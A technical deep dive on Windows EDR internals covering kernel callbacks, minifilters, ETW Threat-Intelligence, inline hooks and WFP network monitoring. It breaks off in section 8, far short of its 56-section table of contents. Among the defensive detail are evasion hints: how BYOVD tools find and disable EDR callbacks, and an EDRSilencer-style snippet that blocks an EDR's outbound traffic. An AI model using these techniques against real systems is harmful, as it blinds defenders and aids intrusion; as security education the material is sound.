# EDR Internals: A Complete Technical Deep Dive
### How Modern Endpoint Detection and Response Systems See, Think, and Act

---

> *"The EDR is not a product. It is a philosophy instantiated in kernel memory."*  
> — Paraphrased from multiple red team post-mortems

---

## Table of Contents

**Part I — Core Architecture (Sections 1–20)**
1. [What an EDR Actually Is](#1-what-an-edr-actually-is)
2. [The Three Detection Bubbles](#2-the-three-detection-bubbles)
3. [EDR Architecture: Component Map](#3-edr-architecture-component-map)
4. [Kernel Callback Infrastructure](#4-kernel-callback-infrastructure)
5. [File System Minifilter Drivers](#5-file-system-minifilter-drivers)
6. [Event Tracing for Windows (ETW)](#6-event-tracing-for-windows-etw)
7. [User-Mode Hooks and DLL Injection](#7-user-mode-hooks-and-dll-injection)
8. [Network Monitoring via WFP](#8-network-monitoring-via-wfp)
9. [AMSI: The Scripting Safety Net](#9-amsi-the-scripting-safety-net)
10. [AM-PPL, ELAM, and Process Protection](#10-am-ppl-elam-and-process-protection)
11. [PatchGuard and Kernel Integrity Constraints](#11-patchguard-and-kernel-integrity-constraints)
12. [Memory Analysis and VAD Scanning](#12-memory-analysis-and-vad-scanning)
13. [Call Stack Analysis and Validation](#13-call-stack-analysis-and-validation)
14. [Real-World EDR Implementations](#14-real-world-edr-implementations)
15. [Evasion Techniques and EDR Counter-Measures](#15-evasion-techniques-and-edr-counter-measures)
16. [BYOVD: The Nuclear Option](#16-byovd-the-nuclear-option)
17. [HVCI and VBS: The New Frontier](#17-hvci-and-vbs-the-new-frontier)
18. [Hardware-Level Detection: Intel TDT](#18-hardware-level-detection-intel-tdt)
19. [The Detection Arms Race: A Timeline](#19-the-detection-arms-race-a-timeline)
20. [Threat Modeling the EDR Itself](#20-threat-modeling-the-edr-itself)

**Part II — Advanced Kernel Internals (Supplement Topics 1–10)**
- Token Integrity, Privilege Escalation Detection, SEP_TOKEN_PRIVILEGES structure
- Process Tree Reconstruction, PPID spoofing detection, RPC/WMI re-attribution
- Handle Table Analysis (ExEnumHandleTable, ObRegisterCallbacks stripping)
- Linux eBPF-based EDR (kprobes, LSM BPF, fanotify, CO-RE, Falco/Tetragon)
- Cloud Behavioral Graph Analysis, ML models (LSTM+GNN), MITRE ATT&CK automation
- Kernel Shim Engine Abuse (InjectDLL, file-less variant)
- DPC Internals and Kernel Work Items
- WDAC + HVCI + BYOVD Prevention Architecture
- Hypervisor-Level EDR (EPT hooks, Intel PT, VMCS, MBEC, Bitdefender HVMI)
- Sensor Data Enrichment Pipeline (6-stage, PEB walking, hash caching)

**Part III — Deep Internals and Detection Engineering (Sections 21–56)**
- §21: ETW Internal Architecture (WMI_LOGGER_CONTEXT, ETW_GUID_ENTRY, ETW_REG_ENTRY, InfinityHook history)
- §22: Kernel Structure Reference (EPROCESS version offsets, MitigationFlags bit tables, KTHREAD, TOKEN)
- §23: Token Integrity and Privilege Abuse Detection
- §24: Process Genealogy and Cross-Process Attribution
- §25: Handle Table — EDR's Handle on Handles
- §26: Advanced Process Injection Taxonomy (fork, section-based, early-bird, KCT, WNF, thread pool, Herpaderping)
- §27: ALPC — EDR Internal Communication Layer
- §28: Registry Monitoring Deep Dive (Configuration Manager internals, CM callback types)
- §29: Lateral Movement Detection (WMI, PsExec, DCOM, PTH, DCSync)
- §30: Credential Access and LSASS Defense
- §31: Living off the Land (LOLBins/LOLDrivers) Detection
- §32: CET and Shadow Stack — Hardware-Level CFI
- §33: Hypervisor-Level EDR — EPT Hook Architecture
- §34: Linux EDR — eBPF, LSM, fanotify
- §35: Cloud Backend — Behavioral Graph and ML
- §36: Sensor Data Enrichment Pipeline
- §37: macOS EDR — Endpoint Security Framework
- §38: Anti-Forensics and Log Tampering Detection
- §39: Supply Chain and DLL Sideloading Detection
- §40: Network EDR — DNS, DGA, TLS Inspection
- §41: Kernel Shim Engine
- §42: Smart App Control and AI-Based Reputation
- §43: Anti-Debugging Detection
- §44: Detection Engineering — Sigma, KQL, MITRE ATT&CK
- §45: EDR Performance Engineering
- §46: Kernel Integrity Monitoring Beyond PatchGuard
- §47: DPC and Work Item Abuse Detection
- §48: Windows Security Center Integration
- §49: NTFS and File System Security Artifacts
- §50: Object Manager and Security Descriptor Auditing
- §51: Comprehensive BYOVD Driver Vulnerability Taxonomy
- §52: Instrumentation Callbacks (Nirvana) — Deep Dive
- §53: PE Analysis by EDR
- §54: Complete EDR Bypass Hierarchy
- §55: Forensic Acquisition Capabilities
- §56: Emerging Threats and Future EDR Challenges

**Appendix — Precise Kernel Structure Offsets Reference**
- WMI_LOGGER_CONTEXT with x64 offsets (all Windows versions)
- ETW_GUID_ENTRY and ETW_REG_ENTRY precise layouts (Vergilius/Geoff Chappell)
- EPROCESS multi-version offset table (Win10 1909 through Win11 24H2)
- PS_PROTECTION, MitigationFlags, MitigationFlags2 complete bit definitions
- CET Shadow Stack architecture (XSTATE integration, NtContinue validation)
- ALPC PORT_MESSAGE and _ALPC_PORT structures
- WNF state name decode, _WNF_NAME_INSTANCE layout
- KernelCallbackTable PEB offset and function index reference
- PoolParty thread pool injection variants (all 8)
- LDR_DATA_TABLE_ENTRY full 0x120-byte layout

---

## 1. What an EDR Actually Is

An Endpoint Detection and Response system is fundamentally a **kernel-resident observation engine** with a cloud-connected behavioral analysis backend. Unlike traditional AV products that pattern-match file signatures, an EDR's primary job is to watch *what code does*, not *what code looks like*.

The mental model:

```
┌─────────────────────────────────────────────────────────────────┐
│                        EDR Architecture                         │
│                                                                 │
│  ┌─────────────────┐     ┌─────────────────┐                   │
│  │   Kernel Layer  │     │   User Layer     │                   │
│  │                 │     │                 │                   │
│  │  ┌───────────┐  │     │  ┌───────────┐  │                   │
│  │  │  Callbacks│  │     │  │  DLL Hook │  │                   │
│  │  │  (Ps/Ob/  │  │     │  │  (ntdll)  │  │                   │
│  │  │   Cm/ETW) │  │     │  └─────┬─────┘  │                   │
│  │  └─────┬─────┘  │     │        │        │                   │
│  │        │        │     │  ┌─────▼──────┐  │                  │
│  │  ┌─────▼──────┐ │     │  │  AMSI      │  │                  │
│  │  │  Minifilter│ │     │  └─────┬──────┘  │                  │
│  │  │  (fltmgr)  │ │     └────────│─────────┘                  │
│  │  └─────┬──────┘ │              │                            │
│  │        │        │     ┌────────▼──────────┐                 │
│  │  ┌─────▼──────┐ │     │   Sensor Service  │                 │
│  │  │   WFP      │ ├────►│   (Correlation +  │                 │
│  │  │  (Network) │ │     │    Cloud Upload)  │                 │
│  │  └────────────┘ │     └────────┬──────────┘                 │
│  └─────────────────┘              │                            │
│                                   ▼                            │
│                        ┌──────────────────┐                    │
│                        │  Cloud Backend   │                    │
│                        │  (ML / Behavior  │                    │
│                        │   Analysis)      │                    │
│                        └──────────────────┘                    │
└─────────────────────────────────────────────────────────────────┘
```

The key insight: **an EDR wins by having more observation points than an attacker has evasion techniques**. Every layer described in this document is another set of eyes.

---

## 2. The Three Detection Bubbles

The blog post at `blog.deeb.ch/posts/how-edr-works/` introduces the concept of **"Bubbles of Bane"** — three detection layers that an EDR operates within. This is an elegant conceptual framework:

### Bubble 1: File Signature Scanning (Pre-Execution)
The oldest and most brittle layer. Before a file executes, the EDR's AV engine scans it against:
- Hash databases (MD5/SHA256/SHA1 of known-bad files)
- YARA rules (pattern matching across bytes)
- Fuzzy hashing (SSDEEP, TLSH) for variant detection
- Static PE analysis (import table, section entropy, certificate chain)

**Weakness**: Trivially defeated by any mutation — packing, encryption, encoding. This is why EDRs evolved.

### Bubble 2: Memory Scanning (Runtime Detection)
After code executes but before it completes harm:
- Periodic scanning of process memory for shellcode signatures
- Checking VAD (Virtual Address Descriptor) tree for anomalous regions
- Verifying in-memory image integrity against on-disk baseline
- Detecting DLL hollowing via PEB loader list vs. VAD discrepancy

**The key equation**: `on_disk_bytes ≠ in_memory_bytes → modification detected`

### Bubble 3: Behavioral Telemetry (Event-Driven Detection)
The modern core of every serious EDR. Monitors OS events in real-time:
- Process/thread/image-load notifications
- File I/O operations
- Registry modifications
- Network connections
- Memory allocation and protection changes
- API call sequences (behavioral chains)

**This is the hardest layer to defeat** because it monitors the *consequences* of malicious code, not the code itself.

### How the Bubbles Interact

```
Pre-Exec           Runtime              Behavioral
   │                  │                    │
   ▼                  ▼                    ▼
[File Hash] → [Memory Scan] → [API Call] → [Thread Create]
   │                  │                    │
   └──────────────────┴────────────────────┘
                       │
                  [Correlation]
                       │
                  [Alert / Block]
```

No single bubble is sufficient. An attacker who defeats signature scanning still faces memory and behavioral detection. This layered defense is why modern EDR products are fundamentally harder to bypass than 2015-era AV.

---

## 3. EDR Architecture: Component Map

A production EDR deploys the following components:

| Component | Layer | Purpose | Key APIs |
|-----------|-------|---------|----------|
| Kernel callback driver | Kernel | Process/thread/image/registry events | `PsSetCreateProcessNotifyRoutineEx`, `ObRegisterCallbacks`, `CmRegisterCallback` |
| File system minifilter | Kernel | File I/O interception and blocking | `FltRegisterFilter`, `FltCreateCommunicationPort` |
| WFP callout driver | Kernel | Network traffic inspection | `FwpsCalloutRegister`, `FwpmFilterAdd0` |
| ETW-TI subscriber | Kernel (PPL) | Deep memory/API telemetry | `EtwTiLog*` functions, `Microsoft-Windows-Threat-Intelligence` |
| ELAM driver | Pre-boot | Boot driver classification | `ELAM_CALLBACK_REGISTRY_ENTRY` |
| User-mode hook DLL | User | NTAPI call interception | Inline hooks in `ntdll.dll` |
| AMSI provider | User | Script/macro scanning | `AmsiScanBuffer`, `AmsiScanString` |
| Sensor service | User | Event correlation, cloud upload | Named pipe / IOCTL to kernel driver |

### The Data Pipeline

```
Kernel Event (e.g. NtAllocateVirtualMemory)
         │
         ├──► ETW-TI Provider emits THREATINT_ALLOCVM event
         │
         ├──► Process callback fires (if new process)
         │
         └──► Minifilter pre-op (if file involved)
                        │
                        ▼
               EDR Kernel Driver collects
                        │
                        ▼
               IOCTL / Named Pipe to service
                        │
                        ▼
               Sensor Service (correlation, enrichment)
                     [adds: cmdline, PPID, image path,
                      memory region type, callstack]
                        │
                        ▼
               Cloud Upload (encrypted, Bond-serialized)
                        │
                        ▼
               ML Backend (behavioral graph analysis)
                        │
                  [Alert / Block / Investigate]
```

---

## 4. Kernel Callback Infrastructure

This is the **beating heart of every modern x64 EDR**. PatchGuard eliminates SSDT hooking, so all legitimate kernel-mode EDR monitoring uses documented callback registration APIs. Here is the complete catalog:

---

### 4.1 Process Notification Callbacks

**Registration API:**
```c
// Requires driver to be compiled with /integritycheck linker flag
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
    BOOLEAN Remove
);

// W10 build 14980+ variant with additional flags
NTSTATUS PsSetCreateProcessNotifyRoutineEx2(
    PSCREATEPROCESSNOTIFYTYPE NotifyType,
    PVOID NotifyInformation,
    BOOLEAN Remove
);
```

**Callback signature:**
```c
VOID ProcessNotifyRoutine(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo   // NULL on termination
);

typedef struct _PS_CREATE_NOTIFY_INFO {
    SIZE_T Size;
    union {
        ULONG Flags;
        struct {
            ULONG FileOpenNameAvailable : 1;
            ULONG IsSubsystemProcess    : 1;
            ULONG Reserved              : 30;
        };
    };
    HANDLE ParentProcessId;    // REAL parent — PPID spoofing does not fool this
    CLIENT_ID CreatingThreadId;
    struct _FILE_OBJECT *FileObject;
    PCUNICODE_STRING ImageFileName;
    PCUNICODE_STRING CommandLine;
    NTSTATUS CreationStatus;   // Mutable! Set to STATUS_ACCESS_DENIED to block
} PS_CREATE_NOTIFY_INFO;
```

**What EDRs extract from this:**
- True parent PID (immune to user-mode PPID spoofing via `UpdateProcThreadAttribute`)
- Full command line (unredacted, from kernel)
- Image path (before any user-mode manipulation)
- Ability to **block process creation** by writing to `CreationStatus`

**Internal storage (for BYOVD removal):**
Callbacks are stored in `PspCreateProcessNotifyRoutine`, a global array in ntoskrnl of up to 64 entries × 8 bytes = 512 bytes. Each entry is an `EX_CALLBACK_ROUTINE_BLOCK` pointer with the low 3 bits used as flags. To find this array at runtime:

```c
// Pattern: scan for LEA instruction referencing the array
// near exported PsSetCreateProcessNotifyRoutine
// then walk array, masking each entry: ptr & ~0xF → EX_CALLBACK_ROUTINE_BLOCK
// The actual callback is at EX_CALLBACK_ROUTINE_BLOCK.Function
```

---

### 4.2 Thread Notification Callbacks

```c
NTSTATUS PsSetCreateThreadNotifyRoutine(
    PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
);

// Fires for EVERY thread creation, including cross-process (remote threads)
// at kernel level — before user-mode code runs
VOID ThreadNotifyRoutine(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create     // TRUE = creation, FALSE = termination
);
```

**Detection value:** Remote thread injection (classic `CreateRemoteThread` / `NtCreateThreadEx`) fires this callback with `ProcessId ≠ calling process`. EDR correlates this with preceding cross-process `OpenProcess` handle (from `ObRegisterCallbacks`) to identify injection source.

---

### 4.3 Image Load Notification Callbacks

```c
NTSTATUS PsSetLoadImageNotifyRoutine(
    PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine
);

VOID ImageNotifyRoutine(
    PUNICODE_STRING FullImageName,
    HANDLE ProcessId,
    PIMAGE_INFO ImageInfo
);

typedef struct _IMAGE_INFO {
    union {
        ULONG Properties;
        struct {
            ULONG ImageAddressingMode  : 8;
            ULONG SystemModeImage      : 1;  // kernel driver load
            ULONG ImageMappedToAllPids : 1;
            ULONG ExtendedInfoPresent  : 1;
            ULONG MachineTypeMismatch  : 1;
            ULONG ImageSignatureLevel  : 4;
            ULONG ImageSignatureType   : 3;
            ULONG ImagePartialMap      : 1;
            ULONG Reserved             : 12;
        };
    };
    PVOID ImageBase;
    ULONG ImageSelector;
    SIZE_T ImageSize;
    ULONG ImageSectionNumber;
} IMAGE_INFO;
```

**Note**: No unload notification API exists. EDRs must infer DLL unloads from `FreeLibrary` hooks or memory scanning.

**Reflective DLL detection**: Reflective DLLs (`ReflectiveLoader`) map themselves manually using `NtAllocateVirtualMemory` + `NtProtectVirtualMemory` without going through the normal section-mapping path. This fires ETW-TI events but **does not** trigger `PsSetLoadImageNotifyRoutine`. The result: the DLL appears in the VAD tree as a `MEM_PRIVATE` executable region with no backing file — a high-confidence shellcode indicator.

---

### 4.4 Object Callbacks: Handle Interception

This is how EDRs protect LSASS and high-value processes from credential dumping tools like `mimikatz`.

```c
OB_CALLBACK_REGISTRATION CallbackRegistration = {
    .Version = OB_FLT_REGISTRATION_VERSION,
    .OperationRegistrationCount = 1,
    .Altitude = L"321000",
    .RegistrationContext = NULL,
    .OperationRegistration = &OperationRegistration
};

OB_OPERATION_REGISTRATION OperationRegistration = {
    .ObjectType = PsProcessType,
    .Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
    .PreOperation = PreOperationCallback,
    .PostOperation = NULL
};

// Pre-callback: called BEFORE access check completes
OB_PREOP_CALLBACK_STATUS PreOperationCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation
) {
    // Strip dangerous access rights from any handle to lsass.exe
    if (IsTargetLsass(OperationInformation->Object)) {
        OperationInformation->Parameters->CreateHandleInformation
            .DesiredAccess &= ~(PROCESS_VM_READ | PROCESS_VM_WRITE |
                                PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE);
    }
    return OB_PREOP_SUCCESS;
}
```

**Internals:** Registered callbacks are stored in the `CallbackList` field of the `_OBJECT_TYPE` kernel structure. For process objects: `PsProcessType->CallbackList`. Each entry is an `OB_CALLBACK_ENTRY` with `Enabled` flag — BYOVD tools set this to `0` to disable handle protection.

**Limitation**: Pre-callbacks can *reduce* but not completely *deny* access — the minimum access `ObOpenObjectByPointer` enforces is `PROCESS_QUERY_LIMITED_INFORMATION`. But this prevents `ReadProcessMemory` on LSASS.

---

### 4.5 Registry Callbacks

```c
NTSTATUS CmRegisterCallbackEx(
    PEX_CALLBACK_FUNCTION Function,
    PCUNICODE_STRING Altitude,
    PVOID Driver,
    PVOID Context,
    PLARGE_INTEGER Cookie,
    PVOID Reserved
);

// Fires pre- and post-operation for ALL registry operations
// Pre-op can:
//   - Modify arguments (e.g., redirect key paths)
//   - Short-circuit by returning STATUS_CALLBACK_BYPASS
//   - Block by returning error status
```

**EDR use cases:**
- Block deletion of EDR's own registry persistence keys
- Detect malware persistence (Run keys, service registration)
- Detect Lazarus-style ETW disabling via registry under `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\`

---

## 5. File System Minifilter Drivers

The Filter Manager (`fltmgr.sys`) is a kernel component that sits between the I/O Manager and file system drivers. It allows multiple minifilter drivers to register and intercept IRP (I/O Request Packet) flow.

### Altitude System

Every minifilter registers at a specific **altitude** — a string-represented decimal number. The Filter Manager dispatches operations in **descending altitude order** on the way down (pre-op) and **ascending order** on the way up (post-op).

```
User-mode Request (e.g., CreateFile)
         │
         ▼
    I/O Manager
         │
         ▼
┌────────────────────────────────┐
│        Filter Manager          │
│                                │
│  Altitude 389000 (EDR Type A)  │ ← pre-op first
│  Altitude 321000 (AV Engine)   │
│  Altitude 320500 (EDR Type B)  │
│         ↓ file operation       │
│  Altitude 320500 (EDR Type B)  │ ← post-op first (ascending)
│  Altitude 321000 (AV Engine)   │
│  Altitude 389000 (EDR Type A)  │
└────────────────────────────────┘
         │
         ▼
    NTFS / FAT32 / ReFS
```

**Altitude ranges for security products:**
- `320000–329999`: FSFilter Anti-Virus
- `260000–269999`: FSFilter Content Screener
- `240000–249999`: FSFilter Quota Management

### Registration and Operation

```c
const FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE,          0, PreCreate,   PostCreate   },
    { IRP_MJ_READ,            0, PreRead,     PostRead     },
    { IRP_MJ_WRITE,           0, PreWrite,    PostWrite    },
    { IRP_MJ_SET_INFORMATION, 0, PreSetInfo,  NULL         },
    { IRP_MJ_CLEANUP,         0, PreCleanup,  NULL         },
    { IRP_MJ_OPERATION_END }
};

const FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    ContextRegistration,
    Callbacks,
    UnloadCallback,
    InstanceSetupCallback,
    InstanceQueryTeardownCallback,
    InstanceTeardownStartCallback,
    InstanceTeardownCompleteCallback,
};

FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
FltStartFiltering(gFilterHandle);
```

**Pre-op return values:**
- `FLT_PREOP_SUCCESS_WITH_CALLBACK`: Continue, call post-op
- `FLT_PREOP_SUCCESS_NO_CALLBACK`: Continue, skip post-op
- `FLT_PREOP_COMPLETE`: Short-circuit (block), do not pass to lower filters
- `FLT_PREOP_PENDING`: Queue for async processing (scanning large files)

### Communication Ports: Kernel-to-User Messaging

```c
// Kernel side: create server port
FltCreateCommunicationPort(
    gFilterHandle,
    &gServerPort,
    &objectAttributes,
    NULL,
    ConnectNotifyCallback,     // user-mode client connected
    DisconnectNotifyCallback,  // client disconnected
    MessageNotifyCallback,     // message received from user-mode
    1                          // max clients
);

// User-mode side: connect
FilterConnectCommunicationPort(
    L"\\EDRPort",
    0, NULL, 0,
    NULL,
    &hPort
);
```

### WdFilter.sys Deep Internals

Microsoft Defender's minifilter (`WdFilter.sys`) is the most well-studied production EDR minifilter. Key structures:

```c
// MpData: Global driver state (0xCC0 bytes, pool tag 'MPfd')
typedef struct _MP_DATA {
    // at +0x00: driver object
    // at +0x08: device object
    // at +0x10: filter handle
    // at +0x18: communication ports array [4]
    //   [0] MicrosoftMalwareProtectionControlPort
    //   [1] MicrosoftMalwareProtectionPort
    //   [2] MicrosoftMalwareProtectionVeryLowIoPort
    //   [3] MicrosoftMalwareProtectionRemoteIoPort
    // at +0x40: process callback registration
    // ... (partially reversed)
} MP_DATA;

// ProcessCtx: Per-process context (0xC0 bytes, pool tag 'MPpX')
// Allocated on PsSetCreateProcessNotifyRoutineEx2 callback
// Tracks: process flags, scan state, cached scan results
typedef struct _PROCESS_CTX {
    EPROCESS *Process;
    HANDLE   ProcessId;
    ULONG    Flags;        // IsProtected, IsSystem, IsMpService, etc.
    // scan cache entries
    // ... 
} PROCESS_CTX;
```

WdFilter registers all of the following:
1. `PsSetCreateProcessNotifyRoutineEx2` (W10 14980+) / `Ex` / legacy fallback
2. `PsSetCreateThreadNotifyRoutine`
3. `PsSetLoadImageNotifyRoutine`
4. `ObRegisterCallbacks` for Process + Desktop object types
5. `CmRegisterCallbackEx` for registry events
6. `PoRegisterPowerSettingCallback` for power state changes
7. 4× `FltCreateCommunicationPort` for user-mode communication

---

## 6. Event Tracing for Windows (ETW)

ETW is a high-performance, kernel-resident event logging infrastructure. For EDRs, it provides telemetry that **cannot be defeated by user-mode code patching**.

### ETW Provider Types

| Type | Metadata Location | Introduced |
|------|------------------|-----------|
| Legacy MOF | WMI repository | NT 4.0 |
| Manifest-based | Binary resources + registry | Vista |
| WPP | PDB files (private) | XP |
| TraceLogging | Embedded in binary | W10 |

### The Crown Jewel: Microsoft-Windows-Threat-Intelligence

**GUID**: `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`

This provider emits from **kernel context** after operations complete. It cannot be silenced by patching user-mode `ntdll!EtwEventWrite`. Consumer processes must be `PsProtectedSignerAntimalware-Light` (AM-PPL) — enforced in `EtwpCheckNotificationAccess`.

**Kernel emission functions:**

```
EtwTiLogAllocExecVm        → fires on NtAllocateVirtualMemory with executable protection
EtwTiLogReadWriteVm        → fires on MiReadWriteVirtualMemory (cross-process)
EtwTiLogSetContextThread   → fires on NtSetContextThread
EtwTiLogInsertQueueUserApc → fires on NtQueueApcThread
EtwTiLogProtectVm          → fires on NtProtectVirtualMemory
EtwTiLogMapViewOfSection   → fires on NtMapViewOfSection
EtwTiLogResumeThread       → fires on NtResumeThread
EtwTiLogSuspendThread      → fires on NtSuspendThread
```

**Complete ETW-TI event taxonomy:**

| Event Name | Trigger | Detection Use |
|------------|---------|--------------|
| `THREATINT_ALLOCVM_LOCAL` | `NtAllocateVirtualMemory` in own process | Shellcode staging |
| `THREATINT_ALLOCVM_REMOTE` | `NtAllocateVirtualMemory` cross-process | Process injection |
| `THREATINT_WRITEVM_LOCAL` | `NtWriteVirtualMemory` in own process | Self-modification |
| `THREATINT_WRITEVM_REMOTE` | `NtWriteVirtualMemory` cross-process | Process injection payload write |
| `THREATINT_PROTECTVM_LOCAL` | `NtProtectVirtualMemory` in own process | RWX transition (shellcode) |
| `THREATINT_PROTECTVM_REMOTE` | `NtProtectVirtualMemory` cross-process | Injection setup |
| `THREATINT_MAPVIEW_LOCAL` | `NtMapViewOfSection` in own process | Section injection, PE loading |
| `THREATINT_MAPVIEW_REMOTE` | `NtMapViewOfSection` cross-process | Map injection |
| `THREATINT_QUEUEUSERAPC_REMOTE` | `NtQueueApcThread` cross-process | APC injection |
| `THREATINT_SETTHREADCONTEXT_REMOTE` | `NtSetContextThread` cross-process | Thread hijacking |
| `THREATINT_RESUME_THREAD` | `NtResumeThread` | Post-injection activation |
| `THREATINT_SUSPEND_THREAD` | `NtSuspendThread` | Evasion during injection |

**Critical EPROCESS flags for ETW-TI remote VM events:**

```c
// EPROCESS at offset 0x1F0 (version-dependent):
// Bit 24: EnableReadVmLogging  
// Bit 25: EnableWriteVmLogging
// Without these set, THREATINT_READVM_REMOTE / WRITEVM_REMOTE do NOT fire!

// Enable via:
PROCESS_READWRITEVM_LOGGING_INFORMATION LogInfo = {
    .Flags = 0x3  // bits 0 and 1 = enable read + write logging
};
ZwSetInformationProcess(
    TargetHandle,
    (PROCESSINFOCLASS)87,  // ProcessReadWriteVmLogging
    &LogInfo,
    sizeof(LogInfo)
);
```

### Microsoft Defender for Endpoint ETW Subscriptions

MDE subscribes to **~65 ETW providers** (identified by researchers at FalconForce). Partial list of critical providers:

```
Microsoft-Windows-Threat-Intelligence
Microsoft-Windows-Kernel-Audit-API-Calls
Microsoft-Windows-Security-Auditing
Microsoft-Windows-Kernel-Process
Microsoft-Windows-Kernel-File
Microsoft-Windows-WMI-Activity
Microsoft-Windows-PowerShell
Microsoft-Windows-DotNETRuntime
Microsoft-Windows-RPC
Microsoft-Antimalware-Engine
Microsoft-Windows-DNS-Client
Microsoft-Windows-NTLM
```

Events are serialized using **Microsoft Bond** (binary serialization framework), base64-encoded, then uploaded to the MDE cloud endpoint.

---

## 7. User-Mode Hooks and DLL Injection

While kernel-space monitoring provides the strongest guarantees, EDRs also inject into user space for additional visibility and context.

### DLL Injection Mechanism

When `PsSetCreateProcessNotifyRoutineEx` fires on new process creation, the EDR's kernel driver can:

1. Queue an APC to the main thread pointing to `LoadLibrary`
2. Map its monitoring DLL via `ZwMapViewOfSection` into the new process
3. Use its `PsSetLoadImageNotifyRoutine` callback to track when process initialization completes

The injected DLL installs **inline hooks** in the newly loaded `ntdll.dll`.

### Inline Hooking Mechanics

```
Before Hooking:
  ntdll!NtAllocateVirtualMemory:
    4C 8B D1          mov r10, rcx
    B8 18 00 00 00    mov eax, 0x18   ; SSN
    0F 05             syscall
    C3                ret

After EDR Hooks:
  ntdll!NtAllocateVirtualMemory:
    E9 XX XX XX XX    jmp EDR_Hook_NtAllocateVirtualMemory
    00 00             (overwritten)
    0F 05             syscall         ← unreachable normally
    C3                ret

Trampoline (EDR allocates):
    4C 8B D1          mov r10, rcx   ; original bytes
    B8 18 00 00 00    mov eax, 0x18  ; original bytes
    E9 YY YY YY YY    jmp ntdll+0x7 ; back past hook

EDR Hook Function:
    → capture arguments
    → check if suspicious (cross-process? executable page?)
    → call trampoline (for legitimate calls)
    → emit telemetry event
    → return result
```

For 64-bit targets, the jump requires 14 bytes if the destination is more than 2GB away:

```asm
; 14-byte far jump
48 B8 XX XX XX XX XX XX XX XX   mov rax, <absolute_address>
FF E0                             jmp rax
```

### What EDR Hooks Observe That Kernel Callbacks Miss

| Information | Kernel Callback | User-Mode Hook |
|-------------|----------------|---------------|
| Return address chain (callstack) | ✓ (via ETW) | ✓ (directly) |
| Argument values | Partial (limited by callback type) | Full |
| Heap allocation patterns | ✗ | ✓ |
| String arguments (e.g., command line in `ShellExecute`) | ✗ | ✓ |
| COM object method calls | ✗ | ✓ |
| WinINet / socket content | ✗ | ✓ |

### Hook Self-Integrity

To detect removal of its own hooks, the EDR:
1. Periodically reads its hook targets and compares against installed bytes
2. Uses its own `NtReadVirtualMemory` hook to detect if someone read the hook region (potential recon)
3. Subscribes to ETW-TI `THREATINT_PROTECTVM_LOCAL` events targeting the hook pages

---

## 8. Network Monitoring via WFP

The **Windows Filtering Platform (WFP)** is a set of APIs and kernel services for network packet inspection, filtering, and modification. Modern EDRs use WFP for network telemetry far beyond what the old TDI/NDIS hooking era provided.

### WFP Architecture

```
Application (socket)
      │
      ▼
  ALE Layer (Application Layer Enforcement)
  ┌─────────────────────────────────────────┐
  │  FWPM_LAYER_ALE_AUTH_CONNECT_V4/V6     │ ← connection authorization
  │  FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4/V6 │ ← accept authorization
  │  FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4/V6 │ ← flow creation notification
  └─────────────────────────────────────────┘
      │
      ▼
  Transport Layer
  ┌──────────────────────────────┐
  │  FWPM_LAYER_STREAM_V4/V6   │ ← TCP stream data inspection
  │  FWPM_LAYER_DATAGRAM_DATA  │ ← UDP payload inspection
  └──────────────────────────────┘
      │
      ▼
  Network Layer
  ┌──────────────────────────────┐
  │  FWPM_LAYER_INBOUND_IPPACKET│ ← raw IP packet (no process context)
  │  FWPM_LAYER_OUTBOUND_IPPACKET│
  └──────────────────────────────┘
```

### Callout Driver Registration

```c
// Register callout function
FWPS_CALLOUT0 callout = {
    .calloutKey = MY_CALLOUT_GUID,
    .flags = 0,
    .classifyFn = ClassifyFunction,    // called for each matched packet
    .notifyFn = NotifyFunction,        // filter add/delete notification
    .flowDeleteFn = FlowDeleteFunction // flow teardown
};
FwpsCalloutRegister0(deviceObject, &callout, &calloutId);

// Add filter that routes traffic to callout
FWPM_FILTER0 filter = {
    .layerKey = FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4,
    .action = { .type = FWP_ACTION_CALLOUT_INSPECTION },
    .subLayerKey = MY_SUBLAYER_GUID,
    .weight = { .type = FWP_UINT8, .uint8 = 15 },
    .numFilterConditions = 0   // match all
};
FwpmFilterAdd0(engineHandle, &filter, NULL, &filterId);
```

### WdNisDrv.sys: Windows Defender Network Inspection

`WdNisDrv.sys` (Windows Defender Network Inspection Service Driver) is the WFP callout driver for Defender/MDE:

- **Layers monitored**: `ALE_FLOW_ESTABLISHED_V4/V6`, `STREAM_V4/V6`, `DATAGRAM_DATA_V4/V6`
- **Per-flow context** (`FLOW_CONTEXT` structure): local/remote address, local/remote port, process PID, flow handle, filter flags
- **User-mode communication**: Cancel-safe IRP queues sending `FLOW_NOTIFICATION` (new connection) and `STREAM_DATA_NOTIFICATION` (payload) to `WdNisSvc`
- **Access control**: Device DACL restricts handle acquisition to `WdNisSvc` service account (SID: `NT SERVICE\WdNisSvc`)

**Internal callout location**: Callout entries are stored in a global array at `NETIO!gWfpGlobal + 0x198`. Each 0x50-byte entry contains `ClassifyFunction` at offset `0x10`.

### WFP-Based EDR Evasion (and Why It Fails)

Tools like **EDRSilencer** abuse WFP offensively:

```c
// Identify EDR process by name
// Create block filter targeting EDR's outbound connections
FWPM_FILTER0 blockFilter = {
    .layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4,
    .action = { .type = FWP_ACTION_BLOCK },
    .weight = { .type = FWP_UINT8, .uint8 = 15 },
};
// Add condition: app ID matches EDR executable path
FwpmFilterAdd0(engineHandle, &blockFilter, NULL, &filterId);
```

**Why this is detectable:**
- Windows Security Audit Event **5447** fires on every WFP filter modification
